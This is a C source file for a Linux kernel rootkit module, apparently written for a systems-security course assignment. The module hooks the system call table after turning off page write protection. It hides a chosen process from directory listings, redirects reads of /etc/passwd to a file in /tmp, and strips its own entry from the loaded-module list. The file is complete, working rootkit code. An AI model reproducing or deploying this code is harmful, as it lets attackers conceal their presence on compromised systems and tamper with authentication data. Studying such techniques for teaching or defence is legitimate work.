#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>  // for system call constants
#include <linux/dirent.h>
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/sched.h>

#define PREFIX "sneaky_process"

/* Reference
https://man7.org/linux/man-pages/man2/read.2.html
https://www.cs.bham.ac.uk/~exr/lectures/opsys/13_14/docs/kernelAPI/r4037.html
https://man7.org/linux/man-pages/man2/getdents.2.html
https://aquasecurity.github.io/tracee/v0.13/docs/events/builtin/syscalls/getdents64/
https://linux.die.net/man/2/getdents64
https://cplusplus.com/reference/cstring/memmove/
https://linux.die.net/man/2/openat
*/

static char *SNEAKY_PID = "";
module_param(SNEAKY_PID, charp, 0);
MODULE_PARM_DESC(SNEAKY_PID, "PID of the sneaky process");

// This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr) {
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW) {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr) {
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// Helper function used in sneaky getdents64 to check if the process is sneaky
// and replace it
bool is_sneaky_process(struct linux_dirent64 *current_entry) {
  return (strcmp(current_entry->d_name, PREFIX) == 0) ||
         (strcmp(current_entry->d_name, SNEAKY_PID) == 0);
}

int remove_entry(struct linux_dirent64 *dirp, struct linux_dirent64 *current_entry,
                 int total_len) {
  char *next = (char *)current_entry + current_entry->d_reclen;
  int len = (char *)dirp + total_len - (char *)next;
  total_len -= current_entry->d_reclen;
  memmove(current_entry, next, len);
  return total_len;
}

struct linux_dirent64* next_entry(struct linux_dirent64* entry) {
    return (struct linux_dirent64 *)((char *)entry + entry->d_reclen);
}

// 1. Function pointer will be used to save address of the original 'openat'
// syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_getdents64)(struct pt_regs *);
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int (*original_read)(struct pt_regs *);

asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
  struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
  struct linux_dirent64 *current_entry = dirp;
  int scan = 0;
  int total = (*original_getdents64)(regs);

  if (total <= 0) {
    return total;
  }

  while (scan < total) {
    if (is_sneaky_process(current_entry)) {
      total = remove_entry(dirp, current_entry, total);
      continue;
    }
    scan += current_entry->d_reclen;
    current_entry = next_entry(current_entry);
  }

  return total;
}

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
  // Implement the sneaky part here
  const char *original_path = (const char *)regs->si;
  const char *sneaky_path = "/tmp/passwd";
  if (strcmp(original_path, "/etc/passwd") == 0) {
    copy_to_user((char *)original_path, sneaky_path, strlen(sneaky_path) + 1);
  }
  return (*original_openat)(regs);
}

asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
  ssize_t total = (ssize_t)(*original_read)(regs);
  char *buf = (char *)regs->si;
  char *sneaky_mod_line = strstr(buf, "sneaky_mod ");

  if (total <= 0) {
    return total;
  }
  
  if (sneaky_mod_line != NULL) {
    char *next_module_line = strchr(sneaky_mod_line, '\n') + 1;
    memmove(sneaky_mod_line, next_module_line, buf + total - next_module_line);
    total -= (ssize_t)(next_module_line - sneaky_mod_line);
  }

  return total;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_openat = (void *)sys_call_table[__NR_openat];
  original_read = (void *)sys_call_table[__NR_read];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");